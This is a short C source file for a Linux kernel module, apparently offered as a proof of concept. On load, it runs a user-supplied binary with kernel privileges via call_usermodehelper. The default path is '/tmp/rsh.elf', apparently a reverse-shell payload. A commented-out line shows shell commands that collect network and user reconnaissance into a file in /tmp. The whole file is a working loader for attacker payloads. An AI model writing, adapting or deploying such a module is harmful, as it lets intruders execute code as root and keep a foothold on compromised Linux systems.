// LHP_KERN

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("William Martens");
MODULE_VERSION("Major 1.0");


static int __init LHP_KERN_init(void);
static void __exit LHP_KERN_exit(void);

module_init(LHP_KERN_init);
module_exit(LHP_KERN_exit);

static char *app = "/tmp/rsh.elf";
module_param(app, charp, S_IRUGO);

static int __init LHP_KERN_init(void){
  // example code (poc only)
  //  char *argv[] = {"/bin/sh","-c","netstat >> /tmp/W ; ls / >> /tmp/W ; ip a >> /tmp/W ; who >> /tmp/W",NULL};
  char *argv[] = {app,NULL};
  static char *env[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
  call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
  return 0;
}

static void __exit LHP_KERN_exit(void){
  printk("\t\e[42mLOCKHEED_EXIT [-]\e[0m");
}
